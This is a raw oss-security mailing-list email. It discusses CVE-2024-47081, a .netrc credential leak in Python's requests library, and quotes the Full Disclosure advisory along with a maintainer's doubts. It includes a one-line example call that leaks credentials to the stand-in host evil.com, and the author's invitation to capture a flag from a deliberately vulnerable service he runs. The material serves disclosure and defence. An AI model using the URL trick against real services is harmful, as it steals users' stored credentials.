Received: (qmail 16073 invoked by uid 550); 3 Jun 2025 23:19:08 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 22201 invoked from network); 3 Jun 2025 23:12:34 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=daviey-com.20230601.gappssmtp.com; s=20230601; t=1748992345; x=1749597145; darn=lists.openwall.com;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :from:to:cc:subject:date:message-id:reply-to;
        bh=98+Pw5chlo5h3Vc+BbKS0stCCRpRgPusxyikVZCjAh4=;
        b=Ifd25hxVpLVBCr34HXqVVEEasAJJcuSixm82CprbhD1nrUM9Jki2DVvl/RoIHmYSIx
         caw9h+lFQU2djk4B4nBwfvZH38KLr5QsWPQoGYue1ecOkaJvS7CGfnIaQj7F83Mddypy
         R7gLerRLsOd0vw7Djy+POwUr596bM3MYflu5ch+CMdyDJ5SPtU43HMozQ4ybaOlNHC+C
         qTiSNm4SAZCsFsyAxFY5puLN7v3nGmojXyhOdV6yWvqNxQf0fz/mWdxgah5uWc8F7SAl
         mAmU8iHDCme3Vk367MnIJvD/qYXY+1n7xlNKZY1bgKNfsdo9g+iw4t8IqZlPL6v1IxoV
         ebqg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1748992345; x=1749597145;
        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=98+Pw5chlo5h3Vc+BbKS0stCCRpRgPusxyikVZCjAh4=;
        b=H18mcCB4KpywoofsEPsKbduSzlANiZtGm09MQzoIpAknv4DGDGGoKHuZFOPERd2KLo
         /eV7J6oIs6MtqrE9G5AJLxOcEZ0oJv6wXJQk0/BGEmmjrgvy9XGJG2AjmIfxeTMvk+qD
         Vz4fttTybd0VY0idk2hiGR9iFLdhi1D4BcqXDpLAMNNBkaDhnaxhJiid59TIxXeSwbBY
         dDsj/FnDqeGVzD5myCU/GEVwls/EduOZvbhZG5ry5bKvQ8CLQGlkodFkATHvS7EYaUnZ
         S/fK6bzx46LMKWJoj3J0nVNdxJaEb81xtbdO/W/dIMRzqT0scLeommu3UYj47H1DxTNI
         +syA==
X-Gm-Message-State: AOJu0YyvK3XjOBGl2bWG9QG1D1jvhi0UyJ+pvRcTgr3gTGv/qMRd2kmV
	8kaSHos+wFx7WmbFFMN9A5kuSc9y7gDqvAkmOLd2nb9cFcHyAlso2Voc3gAQc7df5coBkg7dvWE
	lJj9wCrHjOEYQeNOeVtt3VvUkPQQoyUQfMe9ZYulzxRd5UzfWJb70Lj6xTw==
X-Gm-Gg: ASbGncthyCzPsI+RzYCc+eemfSIuwqQiW69C0UOfndZsl3YXr2eZjIRTiMANw9BIunR
	3Fzw3sjxajyqDY+ZFYqZxBrgl1sFfWDZDtz28O/32XXVSde50C0rzOAXrgmkjfa6xyHuApQvsFt
	m30ArBE1nu23KIv30YGKwGwZItoR/FsuOjYp4A0cjQZCk=
X-Google-Smtp-Source: AGHT+IH7/I16nQNT/9LnsI3ultioNdTNftieICqmwGNs0RgZ+f0l7S6Y5K6F2NTPDn9VCaBuc4vbR286N7fx6m5XqSE=
X-Received: by 2002:a05:651c:1547:b0:308:f48a:5560 with SMTP id
 38308e7fff4ca-32ac71c00d0mr595701fa.8.1748992344537; Tue, 03 Jun 2025
 16:12:24 -0700 (PDT)
MIME-Version: 1.0
References: <vXnhIIDfNauWIt5MizRQzyPhX--T3oCrKfPV4ixDc2J1W9iwF3zUR7g-9q1zz966EbG6Nf3Q5EX37ezTHJR_HgHXshROjRfXLDWl1AEInXA=@protonmail.ch>
 <e93b9bb3-c2ac-4640-bd23-8b7d2ba1b3f8@oracle.com>
In-Reply-To: <e93b9bb3-c2ac-4640-bd23-8b7d2ba1b3f8@oracle.com>
From: Dave Walker <email@daviey.com>
Date: Wed, 4 Jun 2025 00:12:12 +0100
X-Gm-Features: AX0GCFt6KUlY_VAQASxj4kk2WRytVtZTKuMg7VvZvZprI-MVXU6KGhKS-AsOx3o
Message-ID: <CABYGfa2Oao0uSyfdmxXx94QTgGiZJib2t5VHP5vyDD0qQMZgew@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="000000000000694c560636b303a9"
Subject: Re: [oss-security] CVE-2024-47081: Netrc credential leak in PSF
 requests library

--000000000000694c560636b303a9
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi,

Well, it's probably just a coincidence, but I literally just spun up a web
service that does exactly this: https://isitup.daviey.com/

The code doesn't make any reference to a .netrc, but I happen to have one
in ~/.netrc:

```
machine localhost
login *REDACTED*
password CTF{*REDACTED*}
```

It's not ideal that requests automatically slurps credentials from ~/.netrc
and leaks them, even when my code never references it. It's possible that
the netrc is on the same server from a different application, developer
debugging environment, or just forgotten about etc.

First one to grab the flag wins, well, nothing. But have fun.  I'll keep it
online for a couple of weeks, or until the VC money runs out.

Thanks

--
Kind Regards,
Dave Walker

On Tue, 3 Jun 2025 at 18:12, Alan Coopersmith <alan.coopersmith@oracle.com>
wrote:

> [I'm not sure how the attacker is supposed to get the victim to make a
>   requests call using a URL the attacker controls, but that didn't stop
>   them from getting a CVE issued for this. -alan- ]
>
>
> -------- Forwarded Message --------
> Subject: [FD] CVE-2024-47081: Netrc credential leak in PSF requests libra=
ry
> Date: Sat, 31 May 2025 06:30:50 +0000
> From: Juho Fors=C3=A9n via Fulldisclosure <fulldisclosure@seclists.org>
> Reply-To: Juho Fors=C3=A9n <jupenur@protonmail.ch>
> To: fulldisclosure@seclists.org <fulldisclosure@seclists.org>
>
> The PSF requests library (https://github.com/psf/requests &
> https://pypi.org/project/requests/) leaks .netrc credentials to third
> parties due to incorrect URL processing under specific conditions.
>
> Issuing the following API call triggers the vulnerability:
>
>    requests.get('http://example.com:@evil.com/')
>
> Assuming .netrc credentials are configured for example.com, they are
> leaked to evil.com by the call.
>
> The root cause is
> https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011=
c012/src/requests/utils.py#L240-L245
>
> The vulnerability was originally reported to the library maintainers on
> September 12, 2024, but no fix is available. CVE-2024-47081 has been
> reserved by GitHub for this issue.
>
> As a workaround, clients may explicitly specify the credentials used on
> every API call to disable .netrc access.
> _______________________________________________
> Sent through the Full Disclosure mailing list
> https://nmap.org/mailman/listinfo/fulldisclosure
> Web Archives & RSS: https://seclists.org/fulldisclosure/
>

--000000000000694c560636b303a9--
